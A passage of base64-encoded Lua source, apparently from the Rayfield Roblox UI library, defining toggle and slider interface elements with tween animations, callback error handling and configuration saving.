hc2luZ1N0eWxlLkV4cG9uZW50aWFsLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7Q29sb3IgPSBTZWxlY3RlZFRoZW1lLlRvZ2dsZURpc2FibGVkU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvciwgVHdlZW5JbmZvLm5ldygwLjgsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVEaXNhYmxlZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjU1LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7Q29sb3IgPSBTZWxlY3RlZFRoZW1lLlRvZ2dsZURpc2FibGVkT3V0ZXJTdHJva2V9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5Td2l0Y2guSW5kaWNhdG9yLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1NpemUgPSBVRGltMi5uZXcoMCwxNywwLDE3KX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoJCQkJZW5kCgoJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQkJaWYgZGVidWdYIHRoZW4gd2FybignUnVubmluZyB0b2dnbGUgXCcnLi5Ub2dnbGVTZXR0aW5ncy5OYW1lLi4nXCcgKDpTZXQpJykgZW5kCgoJCQkJCVRvZ2dsZVNldHRpbmdzLkNhbGxiYWNrKFRvZ2dsZVNldHRpbmdzLkN1cnJlbnRWYWx1ZSkKCQkJCWVuZCkKCgkJCQlpZiBub3QgU3VjY2VzcyB0aGVuCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4NSwgMCwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVRvZ2dsZS5UaXRsZS5UZXh0ID0gIkNhbGxiYWNrIEVycm9yIgoJCQkJCXByaW50KCJSYXlmaWVsZCB8ICIuLlRvZ2dsZVNldHRpbmdzLk5hbWUuLiIgQ2FsbGJhY2sgRXJyb3IgIiAuLnRvc3RyaW5nKFJlc3BvbnNlKSkKCQkJCQl3YXJuKCdDaGVjayBkb2NzLnNpcml1cy5tZW51IGZvciBoZWxwIHdpdGggUmF5ZmllbGQgc3BlY2lmaWMgZGV2ZWxvcG1lbnQuJykKCQkJCQl0YXNrLndhaXQoMC41KQoJCQkJCVRvZ2dsZS5UaXRsZS5UZXh0ID0gVG9nZ2xlU2V0dGluZ3MuTmFtZQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQllbmQKCgkJCQlpZiBub3QgVG9nZ2xlU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBub3QgVG9nZ2xlU2V0dGluZ3MuRXh0IHRoZW4KCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcgdGhlbgoJCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCBhbmQgVG9nZ2xlU2V0dGluZ3MuRmxhZyB0aGVuCgkJCQkJCVJheWZpZWxkTGlicmFyeS5GbGFnc1tUb2dnbGVTZXR0aW5ncy5GbGFnXSA9IFRvZ2dsZVNldHRpbmdzCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgoKCQkJUmF5ZmllbGQuTWFpbjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoJ0JhY2tncm91bmRDb2xvcjMnKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVRvZ2dsZS5Td2l0Y2guQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlQmFja2dyb3VuZAoKCQkJCWlmIFNlbGVjdGVkVGhlbWUgfj0gUmF5ZmllbGRMaWJyYXJ5LlRoZW1lLkRlZmF1bHQgdGhlbgoJCQkJCVRvZ2dsZS5Td2l0Y2guU2hhZG93LlZpc2libGUgPSBmYWxzZQoJCQkJZW5kCgoJCQkJdGFzay53YWl0KCkKCgkJCQlpZiBub3QgVG9nZ2xlU2V0dGluZ3MuQ3VycmVudFZhbHVlIHRoZW4KCQkJCQlUb2dnbGUuU3dpdGNoLkluZGljYXRvci5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRGlzYWJsZWRTdHJva2UKCQkJCQlUb2dnbGUuU3dpdGNoLkluZGljYXRvci5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVEaXNhYmxlZAoJCQkJCVRvZ2dsZS5Td2l0Y2guVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlRvZ2dsZURpc2FibGVkT3V0ZXJTdHJva2UKCQkJCWVsc2UKCQkJCQlUb2dnbGUuU3dpdGNoLkluZGljYXRvci5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZFN0cm9rZQoJCQkJCVRvZ2dsZS5Td2l0Y2guSW5kaWNhdG9yLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRvZ2dsZUVuYWJsZWQKCQkJCQlUb2dnbGUuU3dpdGNoLlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVFbmFibGVkT3V0ZXJTdHJva2UKCQkJCWVuZAoJCQllbmQpCgoJCQlyZXR1cm4gVG9nZ2xlU2V0dGluZ3MKCQllbmQKCgkJLS0gU2xpZGVyCgkJZnVuY3Rpb24gVGFiOkNyZWF0ZVNsaWRlcihTbGlkZXJTZXR0aW5ncykKCQkJbG9jYWwgU0xEcmFnZ2luZyA9IGZhbHNlCgkJCWxvY2FsIFNsaWRlciA9IEVsZW1lbnRzLlRlbXBsYXRlLlNsaWRlcjpDbG9uZSgpCgkJCVNsaWRlci5OYW1lID0gU2xpZGVyU2V0dGluZ3MuTmFtZQoJCQlTbGlkZXIuVGl0bGUuVGV4dCA9IFNsaWRlclNldHRpbmdzLk5hbWUKCQkJU2xpZGVyLlZpc2libGUgPSB0cnVlCgkJCVNsaWRlci5QYXJlbnQgPSBUYWJQYWdlCgoJCQlTbGlkZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJU2xpZGVyLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQkJU2xpZGVyLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgoJCQlpZiBTZWxlY3RlZFRoZW1lIH49IFJheWZpZWxkTGlicmFyeS5UaGVtZS5EZWZhdWx0IHRoZW4KCQkJCVNsaWRlci5NYWluLlNoYWRvdy5WaXNpYmxlID0gZmFsc2UKCQkJZW5kCgoJCQlTbGlkZXIuTWFpbi5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TbGlkZXJCYWNrZ3JvdW5kCgkJCVNsaWRlci5NYWluLlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5TbGlkZXJTdHJva2UKCQkJU2xpZGVyLk1haW4uUHJvZ3Jlc3MuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlNsaWRlclN0cm9rZQoJCQlTbGlkZXIuTWFpbi5Qcm9ncmVzcy5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TbGlkZXJQcm9ncmVzcwoKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGlkZXIsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQkKCgkJCVNsaWRlci5NYWluLlByb2dyZXNzLlNpemUgPQlVRGltMi5uZXcoMCwgU2xpZGVyLk1haW4uQWJzb2x1dGVTaXplLlggKiAoKFNsaWRlclNldHRpbmdzLkN1cnJlbnRWYWx1ZSArIFNsaWRlclNldHRpbmdzLlJhbmdlWzFdKSAvIChTbGlkZXJTZXR0aW5ncy5SYW5nZVsyXSAtIFNsaWRlclNldHRpbmdzLlJhbmdlWzFdKSkgPiA1IGFuZCBTbGlkZXIuTWFpbi5BYnNvbHV0ZVNpemUuWCAqIChTbGlkZXJTZXR0aW5ncy5DdXJyZW50VmFsdWUgLyAoU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMl0gLSBTbGlkZXJTZXR0aW5ncy5SYW5nZVsxXSkpIG9yIDUsIDEsIDApCgoJCQlpZiBub3QgU2xpZGVyU2V0dGluZ3MuU3VmZml4IHRoZW4KCQkJCVNsaWRlci5NYWluLkluZm9ybWF0aW9uLlRleHQgPSB0b3N0cmluZyhTbGlkZXJTZXR0aW5ncy5DdXJyZW50VmFsdWUpCgkJCWVsc2UKCQkJCVNsaWRlci5NYWluLkluZm9ybWF0aW9uLlRleHQgPSB0b3N0cmluZyhTbGlkZXJTZXR0aW5ncy5DdXJyZW50VmFsdWUpIC4uICIgIiAuLiBTbGlkZXJTZXR0aW5ncy5TdWZmaXgKCQkJZW5kCgoJCQlTbGlkZXIuTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZEhvdmVyfSk6UGxheSgpCgkJCWVuZCkKCgkJCVNsaWRlci5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGlkZXIsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCWVuZCkKCgkJCVNsaWRlci5NYWluLkludGVyYWN0LklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihJbnB1dCkKCQkJCWlmIElucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBvciBJbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuIAoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLk1haW4uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5NYWluLlByb2dyZXNzLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJU0xEcmFnZ2luZyA9IHRydWUgCgkJCQllbmQgCgkJCWVuZCkKCgkJCVNsaWRlci5NYWluLkludGVyYWN0LklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihJbnB1dCkgCgkJCQlpZiBJbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgSW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiAKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5NYWluLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwLjR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5NYWluLlByb2dyZXNzLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwLjN9KTpQbGF5KCkKCQkJCQlTTERyYWdnaW5nID0gZmFsc2UgCgkJCQllbmQgCgkJCWVuZCkKCgkJCVNsaWRlci5NYWluLkludGVyYWN0Lk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbihYKQoJCQkJbG9jYWwgQ3VycmVudCA9IFNsaWRlci5NYWluLlByb2dyZXNzLkFic29sdXRlUG9zaXRpb24uWCArIFNsaWRlci5NYWluLlByb2dyZXNzLkFic29sdXRlU2l6ZS5YCgkJCQlsb2NhbCBTdGFydCA9IEN1cnJlbnQKCQkJCWxvY2FsIExvY2F0aW9uID0gWAoJCQkJbG9jYWwgTG9vcDsgTG9vcCA9IFJ1blNlcnZpY2UuU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQlpZiBTTERyYWdnaW5nIHRoZW4KCQkJCQkJTG9jYXRpb24gPSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKS5YCgkJCQkJCUN1cnJlbnQgPSBDdXJyZW50ICsgMC4wMjUgKiAoTG9jYXRpb24gLSBTdGFydCkKCgkJCQkJCWlmIExvY2F0aW9uIDwgU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YIHRoZW4KCQkJCQkJCUxvY2F0aW9uID0gU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YCgkJCQkJCWVsc2VpZiBMb2NhdGlvbiA+IFNsaWRlci5NYWluLkFic29sdXRlUG9zaXRpb24uWCArIFNsaWRlci5NYWluLkFic29sdXRlU2l6ZS5YIHRoZW4KCQkJCQkJCUxvY2F0aW9uID0gU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YICsgU2xpZGVyLk1haW4uQWJzb2x1dGVTaXplLlgKCQkJCQkJZW5kCgoJCQkJCQlpZiBDdXJyZW50IDwgU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YICsgNSB0aGVuCgkJCQkJCQlDdXJyZW50ID0gU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YICsgNQoJCQkJCQllbHNlaWYgQ3VycmVudCA+IFNsaWRlci5NYWluLkFic29sdXRlUG9zaXRpb24uWCArIFNsaWRlci5NYWluLkFic29sdXRlU2l6ZS5YIHRoZW4KCQkJCQkJCUN1cnJlbnQgPSBTbGlkZXIuTWFpbi5BYnNvbHV0ZVBvc2l0aW9uLlggKyBTbGlkZXIuTWFpbi5BYnNvbHV0ZVNpemUuWAoJCQkJCQllbmQKCgkJCQkJCWlmIEN1cnJlbnQgPD0gTG9jYXRpb24gYW5kIChMb2NhdGlvbiAtIFN0YXJ0KSA8IDAgdGhlbgoJCQkJCQkJU3RhcnQgPSBMb2NhdGlvbgoJCQkJCQllbHNlaWYgQ3VycmVudCA+PSBMb2NhdGlvbiBhbmQgKExvY2F0aW9uIC0gU3RhcnQpID4gMCB0aGVuCgkJCQkJCQlTdGFydCA9IExvY2F0aW9uCgkJCQkJCWVuZAoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5NYWluLlByb2dyZXNzLCBUd2VlbkluZm8ubmV3KDAuNDUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIEN1cnJlbnQgLSBTbGlkZXIuTWFpbi5BYnNvbHV0ZVBvc2l0aW9uLlgsIDEsIDApfSk6UGxheSgpCgkJCQkJCWxvY2FsIE5ld1ZhbHVlID0gU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMV0gKyAoTG9jYXRpb24gLSBTbGlkZXIuTWFpbi5BYnNvbHV0ZVBvc2l0aW9uLlgpIC8gU2xpZGVyLk1haW4uQWJzb2x1dGVTaXplLlggKiAoU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMl0gLSBTbGlkZXJTZXR0aW5ncy5SYW5nZVsxXSkKCgkJCQkJCU5ld1ZhbHVlID0gbWF0aC5mbG9vcihOZXdWYWx1ZSAvIFNsaWRlclNldHRpbmdzLkluY3JlbWVudCArIDAuNSkgKiAoU2xpZGVyU2V0dGluZ3MuSW5jcmVtZW50ICogMTAwMDAwMDApIC8gMTAwMDAwMDAKCQkJCQkJTmV3VmFsdWUgPSBtYXRoLmNsYW1wKE5ld1ZhbHVlLCBTbGlkZXJTZXR0aW5ncy5SYW5nZVsxXSwgU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMl0pCgoJCQkJCQlpZiBub3QgU2xpZGVyU2V0dGluZ3MuU3VmZml4IHRoZW4KCQkJCQkJCVNsaWRlci5NYWluLkluZm9ybWF0aW9uLlRleHQgPSB0b3N0cmluZyhOZXdWYWx1ZSkKCQkJCQkJZWxzZQoJCQkJCQkJU2xpZGVyLk1haW4uSW5mb3JtYXRpb24uVGV4dCA9IHRvc3RyaW5nKE5ld1ZhbHVlKSAuLiAiICIgLi4gU2xpZGVyU2V0dGluZ3MuU3VmZml4CgkJCQkJCWVuZAoKCQkJCQkJaWYgU2xpZGVyU2V0dGluZ3MuQ3VycmVudFZhbHVlIH49IE5ld1ZhbHVlIHRoZW4KCQkJCQkJCWxvY2FsIFN1Y2Nlc3MsIFJlc3BvbnNlID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJCQkJCVNsaWRlclNldHRpbmdzLkNhbGxiYWNrKE5ld1ZhbHVlKQoJCQkJCQkJZW5kKQoJCQkJCQkJaWYgbm90IFN1Y2Nlc3MgdGhlbgoJCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoODUsIDAsIDApfSk6UGxheSgpCgkJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGlkZXIuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJCQlTbGlkZXIuVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5TbGlkZXJTZXR0aW5ncy5OYW1lLi4iIENhbGxiYWNrIEVycm9yICIgLi50b3N0cmluZyhSZXNwb25zZSkpCgkJCQkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJCQkJdGFzay53YWl0KDAuNSkKCQkJCQkJCQlTbGlkZXIuVGl0bGUuVGV4dCA9IFNsaWRlclNldHRpbmdzLk5hbWUKCQkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlciwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJCQkJZW5kCgoJCQkJCQkJU2xpZGVyU2V0dGluZ3MuQ3VycmVudFZhbHVlID0gTmV3VmFsdWUKCQkJCQkJCWlmIG5vdCBTbGlkZXJTZXR0aW5ncy5FeHQgdGhlbgoJCQkJCQkJCVNhdmVDb25maWd1cmF0aW9uKCkKCQkJCQkJCWVuZAoJCQkJCQllbmQKCQkJCQllbHNlCgkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLk1haW4uUHJvZ3Jlc3MsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCBMb2NhdGlvbiAtIFNsaWRlci5NYWluLkFic29sdXRlUG9zaXRpb24uWCA+IDUgYW5kIExvY2F0aW9uIC0gU2xpZGVyLk1haW4uQWJzb2x1dGVQb3NpdGlvbi5YIG9yIDUsIDEsIDApfSk6UGxheSgpCgkJCQkJCUxvb3A6RGlzY29ubmVjdCgpCgkJCQkJZW5kCgkJCQllbmQpCgkJCWVuZCkKCgkJCWZ1bmN0aW9uIFNsaWRlclNldHRpbmdzOlNldChOZXdWYWwpCgkJCQlsb2NhbCBOZXdWYWwgPSBtYXRoLmNsYW1wKE5ld1ZhbCwgU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMV0sIFNsaWRlclNldHRpbmdzLlJhbmdlWzJdKQoKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLk1haW4uUHJvZ3Jlc3MsIFR3ZWVuSW5mby5uZXcoMC40NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1NpemUgPSBVRGltMi5uZXcoMCwgU2xpZGVyLk1haW4uQWJzb2x1dGVTaXplLlggKiAoKE5ld1ZhbCArIFNsaWRlclNldHRpbmdzLlJhbmdlWzFdKSAvIChTbGlkZXJTZXR0aW5ncy5SYW5nZVsyXSAtIFNsaWRlclNldHRpbmdzLlJhbmdlWzFdKSkgPiA1IGFuZCBTbGlkZXIuTWFpbi5BYnNvbHV0ZVNpemUuWCAqIChOZXdWYWwgLyAoU2xpZGVyU2V0dGluZ3MuUmFuZ2VbMl0gLSBTbGlkZXJTZXR0aW5ncy5SYW5nZVsxXSkpIG9yIDUsIDEsIDApfSk6UGxheSgpCgkJCQlTbGlkZXIuTWFpbi5JbmZvcm1hdGlvbi5UZXh0ID0gdG9zdHJpbmcoTmV3VmFsKSAuLiAiICIgLi4gKFNsaWRlclNldHRpbmdzLlN1ZmZpeCBvciAiIikKCgkJCQlsb2NhbCBTdWNjZXNzLCBSZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlTbGlkZXJTZXR0aW5ncy5DYWxsYmFjayhOZXdWYWwpCgkJCQllbmQpCgoJCQkJaWYgbm90IFN1Y2Nlc3MgdGhlbgoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2xpZGVyLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoODUsIDAsIDApfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGlkZXIuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlTbGlkZXIuVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5TbGlkZXJTZXR0aW5ncy5OYW1lLi4iIENhbGxiYWNrIEVycm9yICIgLi50b3N0cmluZyhSZXNwb25zZSkpCgkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJdGFzay53YWl0KDAuNSkKCQkJCQlTbGlkZXIuVGl0bGUuVGV4dCA9IFNsaWRlclNldHRpbmdzLk5hbWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlciwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFNsaWRlci5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJZW5kCgoJCQkJU2xpZGVyU2V0dGluZ3MuQ3VycmVudFZhbHVlID0gTmV3VmFsCgkJCQlpZiBub3QgU2xpZGVyU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nIHRoZW4KCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCBhbmQgU2xpZGVyU2V0dGluZ3MuRmxhZyB0aGVuCgkJCQkJUmF5ZmllbGRMaWJyYXJ5LkZsYWdzW1NsaWRlclNldHRpbmdzLkZsYWddID0gU2xpZGVyU2V0dGluZ3MKCQkJCWVuZAoJCQllbmQKCgkJCVJheWZpZWxkLk1haW46R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdCYWNrZ3JvdW5kQ29sb3IzJyk6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlpZiBTZWxlY3RlZFRoZW1lIH49IFJheWZpZWxkTGlicmFyeS5UaGVtZS5EZWZhdWx0IHRoZW4KCQkJCQlTbGlkZXIuTWFpbi5TaGFkb3cuVmlzaWJsZSA9IGZhbHNlCgkJCQllbmQKCgkJCQlTbGlkZXIuTWFpbi5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TbGlkZXJCYWNrZ